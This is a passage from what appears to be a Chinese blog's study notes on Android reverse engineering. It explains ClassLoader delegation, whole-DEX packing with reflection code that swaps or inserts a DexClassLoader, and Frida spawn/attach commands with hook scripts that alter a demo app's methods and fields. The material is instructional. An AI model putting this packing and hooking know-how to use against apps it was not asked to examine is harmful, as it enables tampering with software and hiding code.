的一个内部类，是包访问权限，所以应用程序无权直接访问</p><p><code>BootClassLoader</code>没有父加载器，在缓存取不到类是直接调用自己的<code>findClass()</code>方法<br><code>findClass()</code>方法调用<code>Class.classForName()</code>方法，而<code>ZygoteInit.preloadClasses()</code>中，加载基本类是<code>Class.forName()</code></p><p>无论是系统类加载器（<code>PathClassLoader</code>）还是自定义的类加载器（<code>DexClassLoader</code>），最顶层的祖先加载器默认是 <code>BootClassLoader</code>，与 JVM 一样，保证了基本类的类型安全</p><h5 id="Class文件加载："><a href="#Class文件加载：" class="headerlink" title="Class文件加载："></a>Class文件加载：</h5><ol><li>通过<code>Class.forName()</code>方法动态加载</li><li>通过<code>ClassLoader.loadClass()</code>方法动态加载</li></ol><p>类的加载分为3个步骤:<strong>1.装载(Load),2.链接(Link),3.初始化(Intialize)</strong></p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202510111544544.png" alt="image-20250929140247689"></p><p><strong>类加载时机：</strong></p><p>1.隐式加载:</p><ol><li>创建类的实例,也就是new一个对象</li><li>访问某个类或接口的静态变量,或者对该静态变量赋值</li><li>调用类的静态方法</li><li>反射<code>Class.forName(&quot;android.app.ActivityThread&quot;)</code></li><li>初始化一个类的子类(会首先初始化子类的父类)</li></ol><p>2.显示加载：</p><ol><li>使用<code>LoadClass()</code>加载</li><li>使用<code>forName()</code>加载</li></ol><p><strong>Class.forName 和 ClassLoader.loadClass加载有何不同：</strong></p><ol><li><code>ClassLoader.loadClass</code>也能加载一个类,但是不会触发类的初始化(也就是说不会对类的静态变量,静态代码块进行初始化操作)</li><li><code>Class.forName</code>这种方式,不但会加载一个类,还会触发类的初始化阶段,也能够为这个类的静态变量,静态代码块进行初始化操作</li></ol><h5 id="PathClassLoader"><a href="#PathClassLoader" class="headerlink" title="PathClassLoader"></a>PathClassLoader</h5><p>主要用于系统和app的类加载器,其中<code>optimizedDirectory</code>为<code>null</code>, 采用默认目录<code>/data/dalvik-cache/</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PathClassLoader 是作为应用程序的系统类加载器，也是在 Zygote 进程启动的时候初始化的（基本流程为：ZygoteInit.main() -&gt; ZygoteInit.forkSystemServer() -&gt; ZygoteInit.handleSystemServerProcess() -&gt; ZygoteInit.createPathClassLoader()。在预加载基本类之后执行），所以每一个 APP 进程从 Zygote 中 fork 出来之后都自动携带了一个 PathClassLoader，它通常用于加载 apk 里面的 .dex 文件</span><br></pre></td></tr></table></figure><h5 id="DexClassLoader"><a href="#DexClassLoader" class="headerlink" title="DexClassLoader"></a>DexClassLoader</h5><p>我们可以发现<code>DexClassLoader</code>与<code>PathClassLoader</code>都继承于<code>BaseDexClassLoader</code>，这两个类只是提供了自己的构造函数，<strong>没有额外的实现</strong></p><p><strong>区别：</strong><br><code>DexClassLoader</code>提供了<code>optimizedDirectory</code>，而<code>PathClassLoader</code>则没有，<code>optimizedDirectory</code>正是用来存放<code>odex</code>文件的地方，所以可以利用<code>DexClassLoader</code>实现动态加载</p><h5 id="BaseDexClassLoader"><a href="#BaseDexClassLoader" class="headerlink" title="BaseDexClassLoader"></a>BaseDexClassLoader</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BaseDexClassLoader</span> <span class="keyword">extends</span> <span class="title class_">ClassLoader</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> DexPathList pathList;  <span class="comment">//记录dex文件路径信息</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">BaseDexClassLoader</span><span class="params">(String dexPath, File optimizedDirectory, String libraryPath, ClassLoader parent)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(parent);</span><br><span class="line">        <span class="built_in">this</span>.pathList = <span class="keyword">new</span> <span class="title class_">DexPathList</span>(<span class="built_in">this</span>, dexPath, libraryPath, optimizedDirectory);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><code>dexPath</code>: 包含目标类或资源的apk&#x2F;jar列表;当有多个路径则采用:分割;</li><li><code>optimizedDirectory</code>: 优化后dex文件存在的目录, 可以为null;</li><li><code>libraryPath</code>: native库所在路径列表;当有多个路径则采用:分割;</li><li><code>ClassLoader</code>:父类的类加载器</li></ul><p><code>BaseDexClassLoader</code>会初始化<code>dexPathList</code>，收集<code>dex</code>文件和<code>Native</code>文件动态库</p><p>………（<a href="https://bbs.kanxue.com/thread-271538.htm%EF%BC%89">https://bbs.kanxue.com/thread-271538.htm）</a></p><p>最后，Android类加载详细流程：</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202510111544545.png" alt="image-20250929143026114"></p><p>假设我们要加载一个类com.example.MyActivity：</p><ol><li>应用通过Custom ClassLoader请求加载类（图中步骤1）</li><li>Custom ClassLoader调用loadClass()，遵循双亲委派，先委托给PathClassLoader（步骤3）</li><li>PathClassLoader委托给BootClassLoader（步骤5）</li><li>BootClassLoader无法加载该类，返回给PathClassLoader（步骤8）</li><li>PathClassLoader调用findClass()方法（步骤9）</li><li>findClass()调用DexPathList的findClass()方法</li><li>DexPathList遍历dexElements数组：</li><li>对每个Element调用findClass()</li><li>Element调用DexFile的loadClassBinaryName()方法</li><li>如果在某个DexFile中找到类，立即返回</li><li>如果PathClassLoader未找到，返回给Custom ClassLoader（步骤11）</li><li>Custom ClassLoader调用自己的findClass()（步骤12）</li><li>同样通过DexPathList查找类</li><li>如果找到，返回类对象（步骤14）</li><li>如果未找到，抛出ClassNotFoundException（步骤15）</li></ol><h3 id="整体加壳原理"><a href="#整体加壳原理" class="headerlink" title="整体加壳原理"></a>整体加壳原理</h3><p><strong>Dex整体加壳</strong>可以理解为在加密的源Apk程序外面有套上了一层外壳，简单过程为：</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202510111544546.png" alt="image-20250929130703014"></p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202510111544547.png" alt="image-20250929130743024" style="zoom:33%;" /><p>加壳例子：</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202510111544548.png" alt="image-20250929143926144"></p><p>我们很明显看见，除了一个代理类<code>Application</code>，其他相关的代码信息都无法发现</p><p>在代理类中反射调用了一些方法，很显然我们解析出的结果都无法查找，很明显就说明在<code>Application.attchBaseContext()</code>和<code>Application.onCreate()</code>中必须要完成对源加密的<code>dex</code>的<strong>动态加载和解密</strong></p><p>App加载应用解析时流程如下：</p><ol><li><code>BootClassLoader</code>加载系统核心库</li><li><code>PathClassLoader</code>加载APP自身dex</li><li>进入APP自身组件，解析<code>AndroidManifest.xml</code>，然后查找<code>Application</code>代理</li><li>调用声明<code>Application</code>的<code>attachBaseContext()</code>对源程序进行动态加载或解密</li><li>调用声明<code>Application</code>的<code>onCreate()</code>对源程序进行动态加载或解密</li><li>进入<code>MainActivity</code>中的<code>attachBaseContext()</code>，然后进入<code>onCreate()</code>函数，执行源程序代码</li></ol><p>上面我们已经很清晰的了解了壳加载的流程，我们很明显的意识到一个问题，我们从头到尾都是用<code>PathClassLoader</code>来加载dex</p><h4 id="简单整体加壳"><a href="#简单整体加壳" class="headerlink" title="简单整体加壳"></a>简单整体加壳</h4><p>我们要想动态加载dex文件必须使用自定义的<code>DexClassLoader</code>，但是直接使用<code>DexClassLoader</code>进行加载，会报异常，是因为<code>DexClassLoader</code>加载的类是<strong>没有组件生命周期</strong>的，即<code>DexClassLoader</code>即使通过对APK的动态加载完成了对组件类的加载，当系统启动该组件时，依然会出现加载类失败的异常</p><p>所以我们要想使用<code>DexClassLoader</code>进行动态加载dex，我们需要<strong>进行类加载器的修正</strong></p><p>主要有两种方案：</p><ol><li>替换系统组件类加载器为我们的<code>DexClassLoader</code>，同时设置<code>DexClassLoader</code>的<code>parent</code>为系统组件加载器</li><li>打破原有的双亲委派关系，在系统组件类加载器<code>PathClassLoader</code>和<code>BootClassLoader</code>的中间插入我们自己的<code>DexClassLoader</code></li></ol><h5 id="类加载器替换"><a href="#类加载器替换" class="headerlink" title="类加载器替换"></a>类加载器替换</h5><p><code>LoadedApk</code>主要负责加载一个Apk程序，其中有一个字段<code>mclassLoader</code>，我们通过反射来使用我们的<code>DexClassLoader</code>将其替换，就能让我们的<code>DexClassLoader</code>拥有生命周期</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">replaceClassLoader</span><span class="params">(Context context,ClassLoader dexClassLoader)</span>&#123;</span><br><span class="line">   <span class="type">ClassLoader</span> <span class="variable">pathClassLoader</span> <span class="operator">=</span> MainActivity.class.getClassLoader();</span><br><span class="line">   <span class="keyword">try</span> &#123;</span><br><span class="line">       <span class="comment">//1.获取ActivityThread实例</span></span><br><span class="line">       <span class="type">Class</span> <span class="variable">ActivityThread</span> <span class="operator">=</span> pathClassLoader.loadClass(<span class="string">&quot;android.app.ActivityThread&quot;</span>);</span><br><span class="line">       <span class="type">Method</span> <span class="variable">currentActivityThread</span> <span class="operator">=</span> ActivityThread.getDeclaredMethod(<span class="string">&quot;currentActivityThread&quot;</span>);</span><br><span class="line">       <span class="type">Object</span> <span class="variable">activityThreadObj</span> <span class="operator">=</span> currentActivityThread.invoke(<span class="literal">null</span>);</span><br><span class="line">       <span class="comment">//2.通过反射获得类加载器</span></span><br><span class="line">       <span class="comment">//final ArrayMap&lt;String, WeakReference&lt;LoadedApk&gt;&gt; mPackages = new ArrayMap&lt;&gt;();</span></span><br><span class="line">       <span class="type">Field</span> <span class="variable">mPackagesField</span> <span class="operator">=</span> ActivityThread.getDeclaredField(<span class="string">&quot;mPackages&quot;</span>);</span><br><span class="line">       mPackagesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       <span class="comment">//3.拿到LoadedApk</span></span><br><span class="line">       <span class="type">ArrayMap</span> <span class="variable">mPackagesObj</span> <span class="operator">=</span> (ArrayMap) mPackagesField.get(activityThreadObj);</span><br><span class="line">       <span class="type">String</span> <span class="variable">packagename</span> <span class="operator">=</span> context.getPackageName();</span><br><span class="line">       <span class="type">WeakReference</span> <span class="variable">wr</span> <span class="operator">=</span> (WeakReference) mPackagesObj.get(packagename);</span><br><span class="line">       <span class="type">Object</span> <span class="variable">LoadApkObj</span> <span class="operator">=</span> wr.get();</span><br><span class="line">       <span class="comment">//4.拿到mclassLoader</span></span><br><span class="line">       <span class="type">Class</span> <span class="variable">LoadedApkClass</span> <span class="operator">=</span> pathClassLoader.loadClass(<span class="string">&quot;android.app.LoadedApk&quot;</span>);</span><br><span class="line">       <span class="type">Field</span> <span class="variable">mClassLoaderField</span> <span class="operator">=</span> LoadedApkClass.getDeclaredField(<span class="string">&quot;mClassLoader&quot;</span>);</span><br><span class="line">       mClassLoaderField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">       <span class="type">Object</span> <span class="variable">mClassLoader</span> <span class="operator">=</span>mClassLoaderField.get(LoadApkObj);</span><br><span class="line">       Log.e(<span class="string">&quot;mClassLoader&quot;</span>,mClassLoader.toString());</span><br><span class="line">       <span class="comment">//5.将系统组件ClassLoader给替换</span></span><br><span class="line">       mClassLoaderField.set(LoadApkObj,dexClassLoader);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">       e.printStackTrace();</span><br><span class="line">   &#125; <span class="keyword">catch</span> (NoSuchMethodException e) &#123;</span><br><span class="line">       e.printStackTrace();</span><br><span class="line">   &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">       e.printStackTrace();</span><br><span class="line">   &#125; <span class="keyword">catch</span> (InvocationTargetException e) &#123;</span><br><span class="line">       e.printStackTrace();</span><br><span class="line">   &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">       e.printStackTrace();</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="类加载器插入"><a href="#类加载器插入" class="headerlink" title="类加载器插入"></a>类加载器插入</h5><p> 类加载器刚拿到类，并不会直接进行加载，而是先判断自己是否加载，如果没有加载则给自己的父类，父类再给父类，所以我们让<code>DexClassLoader</code>成为<code>PathClassLoader</code>的父类</p><p>这样就可以解决<code>DexClassLoader</code>生命周期的问题</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">replaceClassLoader</span><span class="params">(Context context, ClassLoader dexClassLoader)</span>&#123;</span><br><span class="line">    <span class="comment">//将pathClassLoader父节点设置为DexClassLoader</span></span><br><span class="line">    <span class="type">ClassLoader</span> <span class="variable">pathClassLoaderobj</span> <span class="operator">=</span> context.getClassLoader();</span><br><span class="line">    Class&lt;ClassLoader&gt; ClassLoaderClass = ClassLoader.class;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">parent</span> <span class="operator">=</span> ClassLoaderClass.getDeclaredField(<span class="string">&quot;parent&quot;</span>);</span><br><span class="line">        parent.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        parent.set(pathClassLoaderobj,dexClassLoader);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完成壳加载器的修正后，我们就可以正常的加载dex了</p><p>之后只需要编写<code>Application</code>代理的<code>onCreate</code>和<code>attachBaseContext</code>函数即可</p><h3 id="脱壳方法"><a href="#脱壳方法" class="headerlink" title="脱壳方法"></a>脱壳方法</h3><p>常用fart、frida-dexdump（要先过frida）</p><p>以后补，还在学</p><h2 id="Frida基础知识"><a href="#Frida基础知识" class="headerlink" title="Frida基础知识"></a>Frida基础知识</h2><h4 id="操作模式"><a href="#操作模式" class="headerlink" title="操作模式:"></a>操作模式:</h4><table><thead><tr><th align="left">操作模式</th><th align="left">描述</th><th align="left">优点</th><th align="left">主要用途</th></tr></thead><tbody><tr><td align="left">CLI（命令行）模式</td><td align="left">通过命令行直接将JavaScript脚本注入进程中，对进程进行操作</td><td align="left">便于直接注入和操作</td><td align="left">在较小规模的操作或者需求比较简单的场景中使用</td></tr><tr><td align="left">RPC模式</td><td align="left">使用Python进行JavaScript脚本的注入工作，实际对进程进行操作的还是JavaScript脚本，可以通过RPC传输给Python脚本来进行复杂数据的处理</td><td align="left">在对复杂数据的处理上可以通过RPC传输给Python脚本来进行，有利于减少被注入进程的性能损耗</td><td align="left">在大规模调用中更加普遍，特别是对于复杂数据处理的需求</td></tr></tbody></table><h4 id="注入模式与启动命令"><a href="#注入模式与启动命令" class="headerlink" title="注入模式与启动命令:"></a>注入模式与启动命令:</h4><table><thead><tr><th align="left">注入模式</th><th align="left">描述</th><th align="left">命令或参数</th><th align="left">优点</th><th align="left">主要用途</th></tr></thead><tbody><tr><td align="left">Spawn模式</td><td align="left">将启动App的权利交由Frida来控制，即使目标App已经启动，在使用Frida注入程序时还是会重新启动App</td><td align="left">在CLI模式中，Frida通过加上 -f 参数指定包名以spawn模式操作App</td><td align="left">适合于需要在App启动时即进行注入的场景，可以在App启动时即捕获其行为</td><td align="left">当需要监控App从启动开始的所有行为时使用</td></tr><tr><td align="left">Attach模式</td><td align="left">在目标App已经启动的情况下，Frida通过ptrace注入程序从而执行Hook的操作</td><td align="left">在CLI模式中，如果不添加 -f 参数，则默认会通过attach模式注入App</td><td align="left">适合于已经运行的App，不会重新启动App，对用户体验影响较小</td><td align="left">在App已经启动，或者我们只关心特定时刻或特定功能的行为时使用</td></tr></tbody></table><p>Spawn模式</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f 进程名 -l hook.js</span><br></pre></td></tr></table></figure><p>attach模式 ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U 进程名 -l hook.js</span><br></pre></td></tr></table></figure><h4 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h4><table><thead><tr><th align="left">API名称</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><code>Java.use(className)</code></td><td align="left">获取指定的Java类并使其在JavaScript代码中可用。</td></tr><tr><td align="left"><code>Java.perform(callback)</code></td><td align="left">确保回调函数在Java的主线程上执行。</td></tr><tr><td align="left"><code>Java.choose(className, callbacks)</code></td><td align="left">枚举指定类的所有实例。</td></tr><tr><td align="left"><code>Java.cast(obj, cls)</code></td><td align="left">将一个Java对象转换成另一个Java类的实例。</td></tr><tr><td align="left"><code>Java.enumerateLoadedClasses(callbacks)</code></td><td align="left">枚举进程中已经加载的所有Java类。</td></tr><tr><td align="left"><code>Java.enumerateClassLoaders(callbacks)</code></td><td align="left">枚举进程中存在的所有Java类加载器。</td></tr><tr><td align="left"><code>Java.enumerateMethods(targetClassMethod)</code></td><td align="left">枚举指定类的所有方法。</td></tr></tbody></table><h4 id="日志输出语法区别"><a href="#日志输出语法区别" class="headerlink" title="日志输出语法区别"></a>日志输出语法区别</h4><table><thead><tr><th align="left">日志方法</th><th align="left">描述</th><th align="left">区别</th></tr></thead><tbody><tr><td align="left"><code>console.log()</code></td><td align="left">使用JavaScript直接进行日志打印</td><td align="left">多用于在CLI模式中，<code>console.log()</code>直接输出到命令行界面，使用户可以实时查看。在RPC模式中，<code>console.log()</code>同样输出在命令行，但可能被Python脚本的输出内容掩盖。</td></tr><tr><td align="left"><code>send()</code></td><td align="left">Frida的专有方法，用于发送数据或日志到外部Python脚本</td><td align="left">多用于RPC模式中，它允许JavaScript脚本发送数据到Python脚本，Python脚本可以进一步处理或记录这些数据。</td></tr></tbody></table><h3 id="Frida常用API"><a href="#Frida常用API" class="headerlink" title="Frida常用API"></a>Frida常用API</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义一个名为hookTest1的函数</span></span><br><span class="line">function <span class="title function_">hookTest1</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="comment">//获取一个名为&quot;类名&quot;的Java类，并将其实例赋值给JavaScript变量utils</span></span><br><span class="line">    <span class="type">var</span> <span class="variable">utils</span> <span class="operator">=</span> Java.use(<span class="string">&quot;类名&quot;</span>);</span><br><span class="line">    <span class="comment">//修改&quot;类名&quot;的&quot;method&quot;方法的实现。这个新的实现会接收两个参数（a和b）</span></span><br><span class="line">    utils.method.implementation = function(a, b)&#123;</span><br><span class="line">            <span class="comment">//将参数a和b的值改为123和456。</span></span><br><span class="line">        a = <span class="number">123</span>;</span><br><span class="line">        b = <span class="number">456</span>;</span><br><span class="line">        <span class="comment">//调用修改过的&quot;method&quot;方法，并将返回值存储在`retval`变量中</span></span><br><span class="line">        <span class="type">var</span> <span class="variable">retval</span> <span class="operator">=</span> <span class="built_in">this</span>.method(a, b);</span><br><span class="line">        <span class="comment">//在控制台上打印参数a，b的值以及&quot;method&quot;方法的返回值</span></span><br><span class="line">        console.log(a, b, retval);</span><br><span class="line">        <span class="comment">//返回&quot;method&quot;方法的返回值</span></span><br><span class="line">        <span class="keyword">return</span> retval;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// .overload()</span></span><br><span class="line"><span class="comment">// .overload(&#x27;自定义参数&#x27;)</span></span><br><span class="line"><span class="comment">// .overload(&#x27;int&#x27;)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest2</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>);</span><br><span class="line">    <span class="comment">//overload定义重载函数，根据函数的参数类型填</span></span><br><span class="line">    utils.<span class="property">Inner</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.zj.wuaipojie.Demo$Animal&#x27;</span>,<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a，b</span>)&#123;</span><br><span class="line">        b = <span class="string">&quot;aaaaaaaaaa&quot;</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title class_">Inner</span>(a,b);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest3</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>);</span><br><span class="line">    <span class="comment">//修改类的构造函数的实现，$init表示构造函数</span></span><br><span class="line">    utils.<span class="property">$init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">str</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(str);</span><br><span class="line">        str = <span class="string">&quot;52&quot;</span>;</span><br><span class="line">        <span class="variable language_">this</span>.$init(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">hookTest5</span><span class="params">()</span>&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        <span class="comment">//静态字段的修改</span></span><br><span class="line">        <span class="type">var</span> <span class="variable">utils</span> <span class="operator">=</span> Java.use(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>);</span><br><span class="line">        <span class="comment">//修改类的静态字段&quot;flag&quot;的值</span></span><br><span class="line">        utils.staticField.value = <span class="string">&quot;我是被修改的静态变量&quot;</span>;</span><br><span class="line">        console.log(utils.staticField.value);</span><br><span class="line">        <span class="comment">//非静态字段的修改</span></span><br><span class="line">        <span class="comment">//使用`Java.choose()`枚举类的所有实例</span></span><br><span class="line">        Java.choose(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>, &#123;</span><br><span class="line">            onMatch: function(obj)&#123;<span class="comment">//通过onMatch回调函数访问每个找到的实例,obj代表Frida找到的每一个实例对象</span></span><br><span class="line">                    <span class="comment">//修改实例的非静态字段&quot;_privateInt&quot;的值为&quot;123456&quot;，并修改非静态字段&quot;privateInt&quot;的值为9999。</span></span><br><span class="line">                obj._privateInt.value = <span class="string">&quot;123456&quot;</span>; <span class="comment">//字段名与函数名相同 前面加个下划线</span></span><br><span class="line">                obj.privateInt.value = <span class="number">9999</span>;</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete: function()&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">hookTest6</span><span class="params">()</span>&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        <span class="comment">//内部类</span></span><br><span class="line">        <span class="type">var</span> <span class="variable">innerClass</span> <span class="operator">=</span> Java.use(<span class="string">&quot;com.zj.wuaipojie.Demo$innerClass&quot;</span>);</span><br><span class="line">        console.log(innerClass);</span><br><span class="line">        innerClass.$init.implementation = function()&#123;</span><br><span class="line">            console.log(<span class="string">&quot;eeeeeeee&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">hookTest7</span><span class="params">()</span>&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        <span class="comment">//枚举所有的类与类的所有方法,异步枚举</span></span><br><span class="line">        Java.enumerateLoadedClasses(&#123;</span><br><span class="line">            onMatch: function(name,handle)&#123; <span class="comment">//name和handle参数是由Frida框架自动传入的，分别代表类名和类句柄</span></span><br><span class="line">                    <span class="comment">//过滤类名</span></span><br><span class="line">                <span class="keyword">if</span>(name.indexOf(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>) !=-<span class="number">1</span>)&#123; </span><br><span class="line">                    console.log(name);</span><br><span class="line">                    <span class="type">var</span> <span class="variable">clazz</span> <span class="operator">=</span>Java.use(name);</span><br><span class="line">                    console.log(clazz);</span><br><span class="line">                    <span class="type">var</span> <span class="variable">methods</span> <span class="operator">=</span> clazz.class.getDeclaredMethods();</span><br><span class="line">                    console.log(methods);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            onComplete: function()&#123;&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">hookTest8</span><span class="params">()</span>&#123;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        <span class="type">var</span> <span class="variable">Demo</span> <span class="operator">=</span> Java.use(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>);</span><br><span class="line">        <span class="comment">//getDeclaredMethods枚举所有方法</span></span><br><span class="line">        <span 